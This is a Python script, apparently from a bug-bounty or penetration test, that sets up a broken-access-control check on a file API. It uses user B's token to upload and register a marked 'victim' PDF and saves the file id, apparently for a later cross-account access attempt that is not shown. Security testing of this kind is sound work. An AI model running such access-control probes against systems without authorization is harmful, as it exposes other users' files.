import json,subprocess,os,hashlib,base64
H=os.environ['H']; BB=os.environ['BB']
TA=open('/tmp/tok_A').read().strip()
TB=open('/tmp/tok_B').read().strip()
def req(method,path,body=None,tok=None):
    cmd=['curl','-s','-m','60','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+(tok or TA),'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()

CONTENT=b"%PDF-1.4\nZX-BAC-VICTIM-FILE-OWNED-BY-230\n%%EOF\n"
md5=base64.b64encode(hashlib.md5(CONTENT).digest()).decode()
print("=== STEP 1: B(230) uploads a file (full legit flow) ===")
c,b=req('POST','/api/v1/files/s3_upload_signature',
        {"file_name":"zx-bac-victim.pdf","model_name":None,"model_id":None,"content_hash":md5},tok=TB)
print(f"  sign -> {c}")
d=json.loads(b); fd=d['formData']; url=d.get('url')
key=fd.get('key'); print(f"  key={key}")
# upload to S3 with the presigned policy
args=['curl','-s','-m','60','-o','/tmp/s3out','-w','%{http_code}','-X','POST',url]
for k,v in fd.items(): args+=['--form-string',f'{k}={v}']
args+=['-F',f'file=@-;filename=zx-bac-victim.pdf;type=application/pdf']
p=subprocess.run(args,input=CONTENT,capture_output=True)
print(f"  S3 upload -> {p.stdout.decode().strip()}")
print("=== STEP 2: B registers the file record ===")
c,b=req('POST','/api/v1/files',
        {"file":{"file_key":key,"name":"zx-bac-victim.pdf","size":len(CONTENT),
                 "type":"application/pdf","content_hash":md5}},tok=TB)
print(f"  register -> {c} {b[:250].replace(chr(10),' ')}")
fid=None
try:
    fid=json.loads(b)['files'][0]['id']
    print(f"  FILE ID = {fid}  (owner = 230)")
    open('/tmp/victim_fid','w').write(str(fid))
except Exception as e: print("  parse err",e)
